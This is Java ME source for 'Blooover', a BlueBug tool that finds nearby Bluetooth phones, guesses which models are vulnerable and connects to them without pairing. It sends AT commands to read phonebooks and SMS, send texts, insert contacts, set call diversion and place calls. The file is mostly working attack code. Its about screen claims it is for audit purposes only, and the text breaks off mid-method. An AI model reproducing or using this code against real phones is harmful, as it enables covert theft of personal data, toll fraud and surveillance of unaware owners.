package org.trifinite.bloover;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.Timer;
import java.util.TimerTask;
import java.util.Vector;

import javax.bluetooth.BluetoothStateException;
import javax.bluetooth.DeviceClass;
import javax.bluetooth.DiscoveryAgent;
import javax.bluetooth.DiscoveryListener;
import javax.bluetooth.LocalDevice;
import javax.bluetooth.RemoteDevice;
import javax.bluetooth.ServiceRecord;
import javax.bluetooth.UUID;
import javax.microedition.io.Connector;
import javax.microedition.io.StreamConnection;
import javax.microedition.lcdui.Alert;
import javax.microedition.lcdui.AlertType;
import javax.microedition.lcdui.Canvas;
import javax.microedition.lcdui.ChoiceGroup;
import javax.microedition.lcdui.Command;
import javax.microedition.lcdui.CommandListener;
import javax.microedition.lcdui.Display;
import javax.microedition.lcdui.Displayable;
import javax.microedition.lcdui.Font;
import javax.microedition.lcdui.Form;
import javax.microedition.lcdui.Graphics;
import javax.microedition.lcdui.Image;
import javax.microedition.lcdui.List;
import javax.microedition.lcdui.TextField;
import javax.microedition.midlet.MIDlet;
import javax.microedition.midlet.MIDletStateChangeException;

/**
 * @author mherfurt Created: 07.04.2004
 */
public class Blooover extends MIDlet implements CommandListener {

	private static String APPNAME = new String("Blooover");
	static final boolean TOA_INTERNATIONAL = true;
	static final boolean TOA_NATIONAL = false;
	static final String SMSTEXTSIGN = ">";            // sign for the begin of the SMS text
	static final int TIMEOUT = 2*60*1000;             // timeout [ms] for SMS run time measurement
	static final int MAXNOSIMSMS = 20;                // maximal number of stored SMS in SIM
	static final String COMPORT = "COM1";             // used COM port for data transmission

	private List startForm;

	private Form deviceForm;

	private Form configForm;

	private Form aboutForm;

	private Display display;

	private Command scanCommand;

	private Command selectCommand;

	private Command configCommand;

	private Command exitCommand;

	private Command detailCommand;

	private Command backCommand;

	private Command attackCommand;

	private Command dismissCommand;

	private List deviceList;

	private Image bsLogo;

	private Image btDevice;

	private Vector devices;

	private LocalDevice device;

	private DiscoveryAgent agent;

	private DiscoveryListener deviceDiscoveryListener;

	private long[] hashVals;

	private int[] sdpRetVals;

	private Image btdevice_icon;

	private WaitingScreen wScreen;

	private Image waitingImage;

	private Vector phoneBooks = new Vector();

	private TextField smsPhoneNumber;

	private Command storeCommand = new Command("Store", Command.BACK, 1);

	private Form attackScreen = new Form("Attacking...");

	private ChoiceGroup attackFeatures = null;
	private TextField	tfSMSPhonenumber = null;
	private TextField	tfSMSText = null;
	private TextField	tfEntryName = null;
	private TextField	tfEntryNumber = null;
	private TextField	tfCallNumber = null;
	private TextField	tfDivertNumber = null;
	private TextField	tfMaxPhonenumbers = null;
	private TextField	tfMaxSMS = null;
	
	// Configuration data (is accessible to configuration GUI and is stored in RMS)
	// configure features that are included in the attack
	private boolean confAttackPhonebookSnarf 		= true;
	private boolean confAttackSendSMS 				= true;
	private boolean confAttackReadSMS 				= true;
	private boolean confAttackSetPhonebookEntry 	= true;
	private boolean confAttackInitPhonecall 		= true;
	private boolean confAttackSetDivert		 		= true;
	private boolean confAttackBlueJack		 		= true;
	// configure information for attack-features
	private int confMaxPhonebookEntries = 10;
	private int confMaxSMS 				= 10;
	private String confSMSPhonenumber 	= new String("+491231234567");
	private String confSMSText 			= new String("Help me! My phone is vulnerable to the BlueBug attack!");
	private String confCallPhonenumber 	= new String("+491231234567");
	private String confEntryName 		= new String("Honey");
	private String confEntryNumber 		= new String("+49190666666");
	private String confDivertNumber 	= new String("+358718008000");
	
	public Blooover() {

		display = Display.getDisplay(this);
		try {
			bsLogo = Image.createImage("/bloooverlogo_midp.png");
			btDevice = Image.createImage("/btdevice.png");
			waitingImage = Image.createImage("/waiting.png");
		} catch (IOException e) {
			displayAlert(e.toString());
		}
	
		tfSMSPhonenumber=new TextField("SMS Phonenumber",confSMSPhonenumber,20,TextField.PHONENUMBER);
		tfCallNumber=new TextField("Call Phonenumber",confCallPhonenumber,20,TextField.PHONENUMBER);
		tfEntryName=new TextField("Entry Name",confEntryName,20,TextField.ANY);
		tfEntryNumber=new TextField("Entry Number",confEntryNumber,20,TextField.PHONENUMBER);
		tfDivertNumber=new TextField("Divert Number",confDivertNumber,20,TextField.PHONENUMBER);
		tfMaxPhonenumbers=new TextField("Number of max. Numbers",Integer.toString(confMaxPhonebookEntries),3,TextField.NUMERIC);
		tfMaxSMS=new TextField("Number of max. SMS",Integer.toString(confMaxSMS),2,TextField.NUMERIC);
		tfSMSText=new TextField("SMS Message Text",confSMSText,160,TextField.ANY);
		attackFeatures = new ChoiceGroup("Attack Features", ChoiceGroup.MULTIPLE);
		attackFeatures.append("Snarf Phonebooks", null);
		attackFeatures.append("Snarf SMS", null);
		attackFeatures.append("Send SMS", null);
		attackFeatures.append("Add Phonebook Entry", null);
		attackFeatures.append("Set Call Divert", null);
		attackFeatures.append("Initiate Voice Call", null);
		
		aboutForm = new Form("About " + APPNAME);
		aboutForm
				.append("The "
						+ APPNAME
						+ " application has been programmed for audit and testing purposes, only. "
						+ APPNAME
						+ " must "
						+ "not be used in order to infringe people's privacy.\nMartin Herfurt and the trifinite.group "
						+ "are not taking liability for any kind of consequences evolving from using this application."
						+ APPNAME
						+ " is available as freeware and may be freely distribiuted "
						+ "with reference to the trifinite.group or trifinite.org, only.\n" 
						+ "For more information, plese visit http://trifinite.org/\n" 
						+ "Make sure to donate some money in order to help us keeping up the work. Thanks!");
		dismissCommand = new Command("Dismiss", Command.CANCEL, 1);
		aboutForm.addCommand(dismissCommand);
		aboutForm.setCommandListener(this);
		startForm = new List(APPNAME, List.IMPLICIT);
		exitCommand = new Command("Exit", Command.EXIT, 2);
		scanCommand = new Command("Scan", Command.OK, 1);
		detailCommand = new Command("Details", Command.ITEM, 1);
		attackCommand = new Command("Attack", Command.ITEM, 1);
		selectCommand = new Command("Select", Command.ITEM, 1);
		startForm.setSelectCommand(selectCommand);
		startForm.addCommand(exitCommand);
		startForm.setCommandListener(this);
		deviceList = new List("Bluetooth Devices", List.IMPLICIT);
		deviceList.setSelectCommand(attackCommand);
		deviceList.addCommand(detailCommand);
		deviceList.addCommand(exitCommand);
		deviceList.setCommandListener(this);
		startForm.append("Find BT-Devices", null);
		startForm.append("Settings", null);
		startForm.append("About", null);
		startForm.append("Exit", null);
		
		devices = new Vector();
		deviceForm = new Form("Device Details");
		configForm = new Form(APPNAME + "Attack Configuration");
		configForm.append(attackFeatures);
		configForm.append("Details for Phonebook Snarf:\n");
		configForm.append(tfMaxPhonenumbers);
		configForm.append("Details for SMS Snarf:\n");
		configForm.append(tfMaxSMS);
		configForm.append("Details for SMS Sending:\n");
		configForm.append(tfSMSPhonenumber);
		configForm.append(tfSMSText);
		configForm.append("Details for Phonebook Entry:\n");
		configForm.append(tfEntryName);
		configForm.append(tfEntryNumber);
		configForm.append("Details for Call Divert:\n");
		configForm.append(tfDivertNumber);
		configForm.append("Details for Voice Call:\n");
		configForm.append(tfCallNumber);
		configForm.addCommand(storeCommand);
		configForm.setCommandListener(this);

		attackScreen.addCommand(dismissCommand);
		attackScreen.setCommandListener(this);
	}

	protected void startApp() throws MIDletStateChangeException {
		new SplashScreen(display, startForm);
		//display.setCurrent(startForm);

		try {
			device = LocalDevice.getLocalDevice();
		} catch (BluetoothStateException e1) {
			displayAlert("It seems as if your device does not have the JABWT (JSR-82) implemented. This application will terminate now.");
			notifyDestroyed();
		}
	}

	protected void pauseApp() {

	}

	protected void destroyApp(boolean arg0) throws MIDletStateChangeException {
	}

	public void commandAction(Command command, Displayable d) {
		String text[] = null;
		String name = null;
		BTDetail dummy = null;
		if ((command == selectCommand) && (startForm.getSelectedIndex() == 3) // exit
				// MIDlet
				&& (d.equals(startForm))) {
			notifyDestroyed();
		} else if (command == exitCommand) { // exit MIDlet
			notifyDestroyed();
		} else if ((command == selectCommand)
				&& (startForm.getSelectedIndex() == 2) // About Screen
				&& (d.equals(startForm))) {
			display.setCurrent(aboutForm);
		} else if ((command == dismissCommand)) {
			display.setCurrent(startForm);
		} else if ((command == selectCommand)
				&& (startForm.getSelectedIndex() == 0) // scan for devices
				&& (d.equals(startForm))) {

			deviceList.deleteAll();
			devices.removeAllElements();

			wScreen = new WaitingScreen(display, deviceList, "scanning");
			wScreen.setMotion(true);
			try {
				deviceDiscoveryListener = new Listener();
				device.setDiscoverable(DiscoveryAgent.GIAC);
				agent = device.getDiscoveryAgent();
				agent.startInquiry(DiscoveryAgent.GIAC, new Listener());
			} catch (BluetoothStateException e) {
				System.out.println("error while scanning");
			}
		} else if ((command == detailCommand) && (d.equals(deviceList))) {
			System.out.println("got detailcommand");

			dummy = getBTDetail((RemoteDevice) devices.elementAt(deviceList
					.getSelectedIndex()));
			deviceForm.append("bta:" + dummy.bluetooth_address + "\nman:"
					+ dummy.manufacturer_name + "\nmodel:" + dummy.model_guess
					+ "\nvend:" + dummy.vendor_name);
			deviceForm.addCommand(exitCommand);
			display.setCurrent(deviceForm);
		} else if ((command == attackCommand) && (d.equals(deviceList))) {
			wScreen = new WaitingScreen(display, deviceList, "attacking");
			wScreen.setMotion(true);
			display.setCurrent(attackScreen);
			new Attacker((RemoteDevice) devices.elementAt(deviceList
					.getSelectedIndex()), new AListener()).start();
		} else if ((command == selectCommand)
				&& (startForm.getSelectedIndex() == 1) && (d.equals(startForm))) {
			smsPhoneNumber.setString(confSMSPhonenumber);
			display.setCurrent(configForm);
		} else if (command == storeCommand) {
			setConfiguration();
			display.setCurrent(startForm);
		}
	}

	public void setConfiguration() {
		confSMSPhonenumber=tfSMSPhonenumber.getString();
		confCallPhonenumber=tfCallNumber.getString();
		confEntryName=tfEntryName.getString();
		confEntryNumber=tfEntryNumber.getString();
		confDivertNumber=tfDivertNumber.getString();
		confMaxPhonebookEntries=Integer.parseInt(tfMaxPhonenumbers.getString());
		confMaxSMS=Integer.parseInt(tfMaxSMS.getString());
		confSMSText=tfSMSText.getString();
		confAttackPhonebookSnarf=attackFeatures.isSelected(0);
		confAttackReadSMS=attackFeatures.isSelected(1);
		confAttackSendSMS=attackFeatures.isSelected(2);
		confAttackSetPhonebookEntry=attackFeatures.isSelected(3);
		confAttackSetDivert=attackFeatures.isSelected(4);
		confAttackInitPhonecall=attackFeatures.isSelected(5);	
	}
	
	public void saveConfiguration() {
		
	}
	
	public long hashProfiles(ServiceRecord[] srs) {

		long hashVal = 0;
		long recordHandle;
		long channelNumber;

		for (int i = 0; i < srs.length; i++) {
			// generate HashVal
			recordHandle = srs[i].getAttributeValue(0x0000).getLong();
			channelNumber = srs[i].getAttributeValue(0x0004).getLong();
			hashVal += (recordHandle * channelNumber);
		}
		displayAlert("Done hashing: " + Long.toString(hashVal));
		//this.notify();
		return hashVal;
	}

	private BTDetail getPhoneModel(BTDetail btDetail) {
		int btHash = 0;
		int searchID = 0;

		try {
			int[] attr = new int[] { 0x0000, 0x0004 };
			searchID = agent.searchServices(attr,
					new UUID[] { new UUID(0x0003) }, btDetail.remote_device,
					new Listener());
		} catch (BluetoothStateException e) {
			//ignored
		}

		displayAlert("Will get Model-Info");
		// wait until search is done !
		// show fancy canvas

		//		while (!((sdpRetVals[searchID]==
		// DiscoveryListener.SERVICE_SEARCH_COMPLETED)
		//			|| (sdpRetVals[searchID] ==
		// DiscoveryListener.SERVICE_SEARCH_DEVICE_NOT_REACHABLE)
		//			|| (sdpRetVals[searchID] == DiscoveryListener.SERVICE_SEARCH_ERROR)
		//			|| (sdpRetVals[searchID] == DiscoveryListener.SERVICE_SEARCH_ERROR)
		//			|| (sdpRetVals[searchID] ==
		// DiscoveryListener.SERVICE_SEARCH_NO_RECORDS)
		//			|| (sdpRetVals[searchID] ==
		// DiscoveryListener.SERVICE_SEARCH_TERMINATED))) {
		try {
			synchronized (this) {
				this.wait(10000);
			}
		} catch (Exception e1) {
			displayAlert(e1.toString());
		}
		displayAlert("Will display now");
		//		}

		switch (Integer.parseInt(Long.toString(hashVals[searchID]))) {
		case 3604685:
		case 3605290:
		case 2621543:
			btDetail.model_guess = "Nokia 6310/6310i";
			btDetail.bug_vulnerable = 1;
			break;
		case 1704044:
		case 1704023:
			btDetail.model_guess = "Nokia 3650";
			btDetail.bug_vulnerable = 10;
			break;
		case 1507391:
			btDetail.model_guess = "Nokia 7650";
			btDetail.bug_vulnerable = 10;
			break;
		case 1704035:
		case 1704034:
			btDetail.model_guess = "Nokia 6600";
			btDetail.bug_vulnerable = 10;
			break;
		case 1704022:
		case 1704020:
			btDetail.model_guess = "Nokia 3650/6600/N-Gage";
			btDetail.bug_vulnerable = 10;
			break;
		case 4391166:
			btDetail.model_guess = "Nokia 6820";
			btDetail.bug_vulnerable = 2;
			break;
		case 4063698:
			btDetail.model_guess = "Sony Ericsson T610/T630/Z600";
			btDetail.bug_vulnerable = 2;
			break;
		case 917518:
			btDetail.model_guess = "Sony Ericsson P800";
			btDetail.bug_vulnerable = 10;
			break;
		case 1179718:
		case 1180018:
		case 1179678:
			btDetail.model_guess = "Sony Ericsson P900";
			btDetail.bug_vulnerable = 10;
			break;
		case 1704014:
			btDetail.model_guess = "Siemens SX1";
			btDetail.bug_vulnerable = 10;
			break;
		case 1188286:
		case 1537756:
			btDetail.model_guess = "Siemens S55";
			btDetail.bug_vulnerable = 10;
			break;
		case 196609:
			btDetail.model_guess = "Motorola A925";
			btDetail.bug_vulnerable = 10;
			break;
		default:
			btDetail.model_guess = "Unrecognized";
			btDetail.bug_vulnerable = 10;
			break;
		}
		return btDetail;
	}

	/**
	 * getBTDetail
	 * 
	 * @author mherfurt Created: 10.04.2004
	 */
	public BTDetail getBTDetail(RemoteDevice rDevice) {

		String btAddr = rDevice.getBluetoothAddress();
		String manu = null;
		String vend = null;
		String icon = null;

		if (btAddr.startsWith("000BAC", 0)) {
			vend = "3com";
			manu = "3Com Europe Ltd.";
			icon = "/btdevice.png";
		} else if (btAddr.startsWith("0001EC", 0)) {
			vend = "Ericsson";
			manu = "Ericsson Group (pre Sony-Ericsson)";
			icon = "/btdevice.png";
		} else if (btAddr.startsWith("008037", 0)) {
			vend = "Sony Ericsson";
			manu = "Ericsson Group (Sony-Ericsson)";
			icon = "/btdevice.png";
		} else if (btAddr.startsWith("000AD9", 0)) {
			vend = "Sony Ericsson";
			manu = "Sony Ericsson Mobile Communications Ab";
			icon = "/btdevice.png";
		} else if (btAddr.startsWith("000E07", 0)) {
			vend = "Sony Ericsson";
			manu = "Sony Ericsson Mobile Communications Ab";
			icon = "/btdevice.png";
		} else if (btAddr.startsWith("006057", 0)) {
			vend = "Nokia";
			manu = "Murata Manufacturing Co., Ltd. (Nokia)";
			icon = "/btdevice.png";
		} else if (btAddr.startsWith("0002EE", 0)) {
			vend = "Nokia";
			manu = "Nokia Danmark A/s";
			icon = "/btdevice.png";
		} else if (btAddr.startsWith("008098", 0)) {
			vend = "TDK";
			manu = "TDK Corporation";
			icon = "/btdevice.png";
		} else if (btAddr.startsWith("0080C8", 0)) {
			vend = "D-Link";
			manu = "D-link Systems, Inc. (CSR Chipset)";
			icon = "/btdevice.png";
		} else if (btAddr.startsWith("0050CD", 0)) {
			vend = "Digianswer";
			manu = "Digianswer A/s";
			icon = "/btdevice.png";
		} else if (btAddr.startsWith("0003C9", 0)) {
			vend = "Tecom";
			manu = "Tecom Co., Ltd.";
			icon = "/btdevice.png";
		} else if (btAddr.startsWith("000393", 0)) {
			vend = "Apple";
			manu = "Apple Computer, Inc.";
			icon = "/btdevice.png";
		} else if (btAddr.startsWith("00033A", 0)) {
			vend = "SiWave";
			manu = "Silicon Wave, Inc.";
			icon = "/btdevice.png";
		} else if (btAddr.startsWith("00025B", 0)) {
			vend = "CSR";
			manu = "Cambridge Silicon Radio";
			icon = "/btdevice.png";
		} else if (btAddr.startsWith("000361", 0)) {
			vend = "Widcomm";
			manu = "Widcomm, Inc.";
			icon = "/btdevice.png";
		} else if (btAddr.startsWith("000A1E", 0)) {
			vend = "Red-M";
			manu = "Red-M (Communications) Limited";
			icon = "/btdevice.png";
		} else if (btAddr.startsWith("001060", 0)) {
			vend = "Billion";
			manu = "Billionton Systems, Inc.";
			icon = "/btdevice.png";
		} else if (btAddr.startsWith("00E003", 0)) {
			vend = "Nokia";
			manu = "Nokia Wireless Business Communications";
			icon = "/btdevice.png";
		} else if (btAddr.startsWith("0002C7", 0)) {
			vend = "Ipaq";
			manu = "Alps Electric Co., Ltd. (Ipaq 38xx)";
			icon = "/btdevice.png";
		} else if (btAddr.startsWith("00D0B7", 0)) {
			vend = "Intel";
			manu = "Intel Corporation (Bluetooth)";
			icon = "/btdevice.png";
		} else if (btAddr.startsWith("000476", 0)) {
			vend = "3com";
			manu = "3 Com Corporation (Bluetooth)";
			icon = "/btdevice.png";
		} else if (btAddr.startsWith("00308E", 0)) {
			vend = "CMT";
			manu = "Cross Match Technologies, Inc. (Axis)";
			icon = "/btdevice.png";
		} else if (btAddr.startsWith("00081B", 0)) {
			vend = "Windigo";
			manu = "Windigo Systems";
			icon = "/btdevice.png";
		} else if (btAddr.startsWith("00037A", 0)) {
			vend = "Taiyo";
			manu = "Taiyo Yuden Co., Ltd.";
			icon = "/btdevice.png";
		} else if (btAddr.startsWith("00E098", 0)) {
			vend = "AboCom";
			manu = "AboCom Systems, Inc. (Palladio USB CSR Chipset)";
			icon = "/btdevice.png";
		} else if (btAddr.startsWith("004005", 0)) {
			vend = "AniCom";
			manu = "Ani Communications Inc.";
			icon = "/btdevice.png";
		} else if (btAddr.startsWith("0007E0", 0)) {
			vend = "Palm";
			manu = "Palm Inc.";
			icon = "/btdevice.png";
		} else if (btAddr.startsWith("0001E3", 0)) {
			vend = "Siemens";
			manu = "Infineon Technologies AG (Siemens)";
			icon = "/btdevice.png";
		} else if (btAddr.startsWith("000A28", 0)) {
			vend = "Motorola";
			manu = "Motorola";
			icon = "/btdevice.png";
		}


		return getPhoneModel(new BTDetail(rDevice, icon, manu, vend, null, 10,10));
	}

	public void displayAlert(String text) {
		//Image test = new Image();
		display.setCurrent(new Alert(text, text, null, AlertType.CONFIRMATION),
				startForm);
	}

	class BTDetail {
		public String bluetooth_address = null;

		public String device_descriptor = null;

		public String vendor_icon = null;

		public String manufacturer_name = null;

		public String vendor_name = null;

		public String model_guess = null;

		public int bug_vulnerable = 10;
		
		public int jack_vulnerable = 10;

		public DeviceClass device_class = null;
		
		public RemoteDevice remote_device = null;

		public BTDetail(RemoteDevice remote_device, String vendor_icon,
				String manufacturer_name, String vendor_name,
				String model_guess, int bug_vulnerable, int jack_vulnerable) {
			this.remote_device = remote_device;
			this.vendor_icon = vendor_icon;
			this.manufacturer_name = manufacturer_name;
			this.vendor_name = vendor_name;
			this.model_guess = model_guess;
			this.bug_vulnerable = bug_vulnerable;
			this.jack_vulnerable = jack_vulnerable;
		}
	}

	class Listener implements DiscoveryListener {
		public void deviceDiscovered(RemoteDevice arg0, DeviceClass arg1) {
			System.out.println("Device detected!");
			try {
				deviceList.append(arg0.getBluetoothAddress(), btDevice);
				devices.addElement(arg0);
				new Alert(arg0.getFriendlyName(true));
			} catch (Exception e) {
				e.printStackTrace();
			}
		}

		public void servicesDiscovered(int number, ServiceRecord[] srs) {
			hashVals[number] = hashProfiles(srs);

		}

		public void serviceSearchCompleted(int arg0, int arg1) {
			sdpRetVals[arg0] = arg1;
			synchronized (this) {
				this.notifyAll();
			}
		}

		public void inquiryCompleted(int arg0) {
			if (deviceList.size() == 0) {
				display
						.setCurrent(
								new Alert(
										"No Device found!",
										"There were no discoverable bluetooth devices in range.",
										null, AlertType.ERROR), startForm);
			} else {
				//			wScreen.setMotion(false);
				//			wScreen.dismiss();
				display.setCurrent(deviceList);

			}
			wScreen.setMotion(false);
		}
	}

	class SplashScreen extends Canvas {
		private Display display;

		private Displayable next;

		private Timer timer = new Timer();

		public SplashScreen(Display display, Displayable next) {
			this.display = display;
			this.next = next;

			display.setCurrent(this);

		}

		protected void keyPressed(int keyCode) {
			dismiss();
		}

		protected void paint(Graphics g) {
			int mHeight = g.getClipHeight();
			int mWidth = g.getClipWidth();
			// Clear the whole screen.
			g.setColor(255, 255, 255);
			g.fillRect(0, 0, mWidth, mHeight);

			g.drawImage(bsLogo, mWidth / 2, mHeight / 2, Graphics.VCENTER
					| Graphics.HCENTER);
		}

		protected void pointerPressed(int x, int y) {
			dismiss();
		}

		protected void showNotify() {
			timer.schedule((TimerTask) new CountDown(), 20000);
		}

		private void dismiss() {
			timer.cancel();
			display.setCurrent(next);
		}

		private class CountDown extends TimerTask {
			public void run() {
				dismiss();
			}
		}
	}

	class WaitingScreen extends Canvas {
		private Display display;

		private Displayable next;

		private Timer timer = new Timer();

		private String message = null;

		private boolean running = true;

		private int mWidth = 0, mHeight = 0;

		private int mCount = 0;

		boolean clearScreen = true;

		public WaitingScreen(Display display, Displayable next, String message) {
			this.display = display;
			this.next = next;
			this.message = message;
			display.setCurrent(this);

			// Create a Timer to update the display.
			TimerTask task = new TimerTask() {
				public void run() {
					mCount = (mCount + 1) % 3;
					repaint();
				}
			};
			Timer timer = new Timer();
			timer.schedule(task, 0, 750);
		}

		public void setMotion(boolean newState) {
			this.running = newState;
		}

		protected void paint(Graphics g) {
			if (running) {
				mWidth = g.getClipWidth();
				mHeight = g.getClipHeight();

				if (clearScreen) {
					g.setColor(255, 255, 255);
					g.fillRect(0, 0, mWidth, mHeight);
					clearScreen = false;
				}

				// Clear the whole screen.
				g.setColor(255, 255, 255);
				g.fillRect(mWidth / 2, mHeight / 2, mWidth, mHeight);
				g.setColor(0, 0, 0);
				g.setFont(Font.getFont(Font.FACE_PROPORTIONAL, Font.STYLE_BOLD,
						Font.SIZE_MEDIUM));
				g.drawImage(waitingImage, mWidth / 2, (mHeight / 2) - 20 ,
						Graphics.VCENTER | Graphics.HCENTER);

				//			Draw the message, if there is a message.
				if ((message != null) && (mCount == 0))
					g.drawString("("+message+")", mWidth / 2, mHeight - 50,
							Graphics.VCENTER | Graphics.HCENTER);
				else if ((message != null) && (mCount == 1))
					g.drawString("( "+message+" )", mWidth / 2, mHeight - 50,
							Graphics.VCENTER | Graphics.HCENTER);
				else if ((message != null) && (mCount == 2))
					g.drawString("(  "+message+"  )", mWidth / 2, mHeight - 50,
							Graphics.VCENTER | Graphics.HCENTER);
			}
		}

		private void dismiss() {
			timer.cancel();
			display.setCurrent(next);
		}
		
		public void setNext(Displayable newNext) {
			next=newNext;
		}

		private class CountDown extends TimerTask {
			public void run() {
				dismiss();
			}
		}
	}

	interface AttackListener {
		void attackCompleted(int returnCode);

		void phoneBookFound(String[][] phoneBook);
	}

	class AListener implements AttackListener {
		public void attackCompleted(int returnCode) {
			wScreen.setMotion(false);
			if (returnCode!=0) {
				wScreen.setNext(attackScreen);
				wScreen.dismiss();
			} else {
				display.setCurrent(new Alert("Problems during attack"), deviceList);
				wScreen.dismiss();
			}
		}

		public void phoneBookFound(String[][] phoneBook) {
			phoneBooks.addElement((Object) phoneBook);
		}
	}

	class Attacker extends Thread {
		AListener attackListener = null;
		RemoteDevice device = null;

		Attacker(RemoteDevice device, AListener attackListener) {
			this.attackListener = attackListener;
			this.device = device;
		}

		public void run() {
			attackDevice();
		}

		private void sendSMS (InputStream is, OutputStream os) {
			SMSTool st = new SMSTool();
		    byte[] pdu_byte = st.getPDUPart(confSMSPhonenumber, TOA_INTERNATIONAL, confSMSText);  // build PDU for SMS
		    char[] pdu_char = st.toHexString(pdu_byte);
		    String pdu = new String(st.convertCharArray2String(pdu_char));
		    sendCommand(is,os,"AT+CMGF=0\r");       			// set message format to PDU mode
		    sendCommand(is,os,"AT+CMGS=" + pdu_byte.length); 	// set length of PDU
		    
		    sendCommand(is,os,"00" + pdu + "\u001A");					    
		}
		
		private String snarfSMS(InputStream is, OutputStream os) {
			String snarfedSMS = null;
			SMSTool st= new SMSTool();
			// Echo off
			sendCommand(is,os,"ATE0\r");
			// set SMS Storage to MT
			sendCommand(is,os,"AT+CPMS=\"MT\"\r");
			
			// snarf SMS Messages
			for (int i=0;i<confMaxSMS;i++) {
				sendCommand(is,os,"AT+CMGR="+ Integer.toString(i) +"\r");
				
			}
			
			return snarfedSMS;
		}
		
		private String snarfPhonebooks(InputStream is, OutputStream os) {
			int confMaxPhonebookEntries = 10;
			String phonebookSnarf = new String();

			// Echo off
			this.sendCommand(is, os, "ATE0\r");
			// get Phonebooklist
			String phonebooks = this.sendCommand(is, os, "AT+CPBS=?\r");
			phonebooks = phonebooks.substring(phonebooks.indexOf('(') + 1,
					phonebooks.indexOf(')'));

			Vector pBooks = new Vector();
			int i = 0;
			do {
				pBooks.addElement((Object) new String(phonebooks.substring(0,
						phonebooks.indexOf(','))));
				phonebooks = phonebooks.substring(phonebooks.indexOf(',') + 1);
			} while (phonebooks.length() > 5);
			pBooks.addElement((Object) new String(phonebooks));

			for (int dummy = 0; dummy < pBooks.size(); dummy++) {
				// Set next Phonebook in VectorList
				this.sendCommand(is, os, "AT+CPBS="
						+ (String) pBooks.elementAt(dummy) + "\r");

				// Get boundaries
				String entries = this.sendCommand(is, os, "AT+CPBR=?\r");
				entries = entries.substring(entries.indexOf('(') + 1, entries
						.indexOf(')'));
				int start = Integer.parseInt(entries.substring(0, entries
						.indexOf('-')));
				int end = Integer.parseInt(entries.substring(entries
						.indexOf('-') + 1));

				// recurse entries
				String phonebookName = null;

				if (((String) pBooks.elementAt(dummy)).indexOf("ME") != -1) {
					phonebookName = new String("Mobile Equipment");
				} else if (((String) pBooks.elementAt(dummy)).indexOf("SM") != -1) {
					phonebookName = new String("SIM Card");
				} else if (((String) pBooks.elementAt(dummy)).indexOf("MT") != -1) {
					phonebookName = new String("Mobile Terminal");
				} else if (((String) pBooks.elementAt(dummy)).indexOf("ON") != -1) {
					phonebookName = new String("Own Numbers");
				} else if (((String) pBooks.elementAt(dummy)).indexOf("DC") != -1) {
					phonebookName = new String("Dialed Contacts");
				} else if (((String) pBooks.elementAt(dummy)).indexOf("MC") != -1) {
					phonebookName = new String("Missed Calls");
				} else if (((String) pBooks.elementAt(dummy)).indexOf("RC") != -1) {
					phonebookName = new String("Received Calls");
				} else if (((String) pBooks.elementAt(dummy)).indexOf("AD") != -1) {
					phonebookName = new String((String) pBooks.elementAt(dummy));
				} else if (((String) pBooks.elementAt(dummy)).indexOf("QD") != -1) {
					phonebookName = new String("Quick Dial");
				} else {
					phonebookName = new String((String) pBooks.elementAt(dummy));
				}

				for (int runner = start; runner <= end; runner++) {
					String entry = new String(this.sendCommand(is, os, "AT+CPBR="
							+ runner + "\r"));
					if ((entry.length() < 4) || ((runner - start) > confMaxPhonebookEntries)) {
						break;
					}

					if ((runner - start) == 0) {
						phonebookSnarf = phonebookSnarf.concat(phonebookName
								+ "\n"); //System.out.println(phonebookName);
						for (int cnt = 0; cnt < phonebookName.length(); cnt++)
							phonebookSnarf = phonebookSnarf.concat("=");
						phonebookSnarf = phonebookSnarf.concat("\n");
					}

					entry = entry.substring(0, entry.indexOf('\r'));
					entry = entry.substring(entry.indexOf(',') + 1);
					String entryNumber = new String(entry.substring(1, entry
							.indexOf(',') - 1));
					entry = entry.substring(entry.indexOf(',') + 1);
					entry = entry.substring(entry.indexOf(',') + 1);
					String entryName = new String(entry.substring(1, entry
							.length() - 1));
					phonebookSnarf = phonebookSnarf.concat(entryName + "\n"
							+ entryNumber + "\n\n");
					//System.out.println(entryName+"\t" + entryNumber);
				}
			}

			return phonebookSnarf;
		}

		private void print(String text) {
			attackScreen.append(text+"\n");
		}
		
		private String sendCommand(InputStream is, OutputStream os, String cmd) {
			String answer = null;
			StringBuffer buffer;
			int c;

			buffer = new StringBuffer(256);

			// send command
			try {
				for (int i = 0; i < cmd.length(); i++) {
					try {
						Thread.sleep(20);
					} catch (Exception e) {
					}
					os.write((byte) cmd.charAt(i));
					os.flush();
				}
			} catch (Exception e) {
				//ignored
			}

			// get answer
			try {
				while (true) {
					c = is.read();
					if (c == -1) {
						buffer.delete(0, buffer.length());
						break;
					}
					buffer.append((char) c);
					if ((buffer.toString().indexOf("OK\r") > -1)
							|| ((buffer.toString().indexOf("ERROR") > -1) && (buffer
									.toString().indexOf("\r") > -1)))
						break;
				}
				while ((buffer.charAt(0) == 13) || (buffer.charAt(0) == 10))
					buffer.delete(0, 1);
				answer = buffer.toString();
			} catch (Exception e) {
				//ignored
			}
			//disconnectIOs(con);
			return answer;
		}

		private String sendCommandSMS(InputStream is, OutputStream os, String cmd) {
			String answer = null;
			StringBuffer buffer;
			int c;

			buffer = new StringBuffer(256);

			// send command
			try {
				for (int i = 0; i < cmd.length(); i++) {
					try {
						Thread.sleep(20);
					} catch (Exception e) {
					}
					os.write((byte) cmd.charAt(i));
					os.flush();
				}
			} catch (Exception e) {
				//ignored
			}

			// get answer
			try {
				while (true) {
					c = is.read();
					if (c == -1) {
						buffer.delete(0, buffer.length());
						break;
					}
					buffer.append((char) c);
					if ((buffer.toString().endsWith("> "))
							|| ((buffer.toString().indexOf("ERROR") > -1) && (buffer
									.toString().indexOf("\r") > -1)))
						break;
				}
				while ((buffer.charAt(0) == 13) || (buffer.charAt(0) == 10))
					buffer.delete(0, 1);
				answer = buffer.toString();
			} catch (Exception e) {
				//ignored
			}
			//disconnectIOs(con);
			return answer;
		}
		
		
		private void attackDevice() {
			String connectionURL 	= "btspp://" + device.getBluetoothAddress() + ":17"; //"btspp://000A28E60A32:3"; //"btspp://" + device.getBluetoothAddress() + ":17";// ":17";
			StreamConnection con 	= null;
			InputStream is 			= null;
			OutputStream os 		= null;
			boolean	attackOK 		= true;
			
			// connect stream connection... under ideal circumstances this happens without pairing
			try {
				con = (StreamConnection) Connector.open(connectionURL);
			} catch (Exception e) {
				//ignored
				attackOK=false;
			}
			
			// open input- and output connection
			if (con!=null) {
				try {
					os = con.openOutputStream();
					is = con.openInputStream();
				} catch (Exception e) {
					//ignored
